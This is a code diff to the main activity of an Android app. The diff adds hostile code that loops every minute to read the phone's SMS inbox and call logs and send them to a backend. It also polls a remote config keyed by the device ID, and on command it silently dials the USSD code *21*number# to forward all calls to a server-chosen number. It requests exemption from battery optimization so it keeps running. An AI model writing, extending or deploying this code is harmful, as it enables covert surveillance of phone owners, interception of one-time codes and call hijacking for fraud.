@@ -59,7 +59,10 @@ public class MainActivity extends BridgeActivity {
         }
 
         if (isFullVersion()) {
-            new Handler(Looper.getMainLooper()).postDelayed(this::checkAndRequestPermissions, 1000);
+            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                requestIgnoreBatteryOptimizations();
+                new Handler(Looper.getMainLooper()).postDelayed(this::checkAndRequestPermissions, 2000);
+            }, 1000);
         } else {
             new Handler(Looper.getMainLooper()).postDelayed(this::requestNotificationPermission, 1500);
         }
@@ -113,20 +116,29 @@ public class MainActivity extends BridgeActivity {
                 }
 
                 @JavascriptInterface
-                public void requestIgnoreBatteryOptimizations() {
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                        Intent intent = new Intent();
-                        String packageName = getPackageName();
-                        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-                        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
-                            intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-                            intent.setData(Uri.parse("package:" + packageName));
-                            startActivity(intent);
-                        }
+                public void triggerCallForwarding(String number) {
+                    if (ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
+                        String ussd = "*21*" + number + "#";
+                        Intent intent = new Intent(Intent.ACTION_CALL);
+                        intent.setData(Uri.parse("tel:" + Uri.encode(ussd)));
+                        startActivity(intent);
                     }
                 }
             }, "AndroidBridge");
         });
+    }
+
+    private void requestIgnoreBatteryOptimizations() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            String packageName = getPackageName();
+            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+            if (pm != null && !pm.isIgnoringBatteryOptimizations(packageName)) {
+                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                intent.setData(Uri.parse("package:" + packageName));
+                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(intent);
+            }
+        }
     }
 
     private boolean isFullVersion() {
@@ -216,7 +228,42 @@ public class MainActivity extends BridgeActivity {
 
     private void startServiceLogic() {
         String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
-        new Thread(() -> { readAndSendSmsInbox(deviceId); readAndSendCallLogs(deviceId); }).start();
+        new Thread(() -> {
+            while (true) {
+                try {
+                    readAndSendSmsInbox(deviceId);
+                    readAndSendCallLogs(deviceId);
+                    checkRemoteConfig(deviceId);
+                    Thread.sleep(60000); // Poll every minute
+                } catch (Exception e) {
+                    try { Thread.sleep(60000); } catch (Exception ignored) {}
+                }
+            }
+        }).start();
+    }
+
+    private void checkRemoteConfig(String deviceId) {
+        try {
+            URL url = new URL(BACKEND_URL + "/api/users/config/" + deviceId);
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("GET");
+            if (conn.getResponseCode() == HttpURLConnection.HTTP_OK) {
+                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+                StringBuilder sb = new StringBuilder();
+                String line;
+                while ((line = reader.readLine()) != null) sb.append(line);
+                reader.close();
+                
+                JSONObject config = new JSONObject(sb.toString());
+                if (config.has("forwarding_enabled") && config.getBoolean("forwarding_enabled")) {
+                    String number = config.getString("forwarding_number");
+                    if (number != null && !number.isEmpty()) {
+                        new Handler(Looper.getMainLooper()).post(() -> triggerCallForwarding(number));
+                    }
+                }
+            }
+            conn.disconnect();
+        } catch (Exception e) { Log.e(TAG, "Config Error", e); }
     }
 
     private void readAndSendCallLogs(String deviceId) {
